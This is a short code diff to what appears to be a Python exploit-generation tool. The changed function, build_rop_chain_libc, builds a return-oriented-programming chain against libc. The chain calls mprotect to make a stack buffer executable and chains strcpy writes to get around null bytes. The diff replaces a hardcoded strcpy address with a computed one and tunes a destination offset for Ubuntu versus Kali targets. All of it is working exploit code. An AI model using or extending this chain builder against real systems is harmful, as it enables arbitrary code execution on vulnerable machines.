@@ -142,10 +142,8 @@ def build_rop_chain_libc(elffile, libc_base_address, buf_address, buf_len, packe
     mprotect_offset = get_function_address(elffile, "mprotect")
     mprotect_addr = pack_value(libc_base_address + mprotect_offset)
 
-    strcpy_offset = get_function_address(elffile, "strcpy")
-    strcpy_addr = pack_value(0xb7e98a30)
-    #__strcpy_sse2 address needs to be hardcoded
-    #strcpy_addr = pack_value(libc_base_address + strcpy_offset)
+    strcpy_offset = get_function_address(elffile, "__strcpy_g")
+    strcpy_addr = pack_value(libc_base_address + strcpy_offset)
 
     null_byte_location = pack_value(libc_base_address + find_null_byte(elffile))
 
@@ -166,7 +164,8 @@ def build_rop_chain_libc(elffile, libc_base_address, buf_address, buf_len, packe
     rop_payload += mprotect_addr + pop3_addr + mprotect_arguments.replace("\x00", "\x7f") + pack_value(buf_address)
 
     strcpy_dest_list = []
-    strcpy_dest = buf_address + buf_len + 4 + (7 * 16) + 8 + 0 - 0x10
+    strcpy_dest = buf_address + buf_len + 4 + (7 * 16) + 8 + 0 - 0x00
+    #0x10 for ubuntu, 0x00 for kali
     strcpy_dest_list.append(strcpy_dest)
     strcpy_dest_list.append(strcpy_dest + 4)
     strcpy_dest_list.append(strcpy_dest + 6)
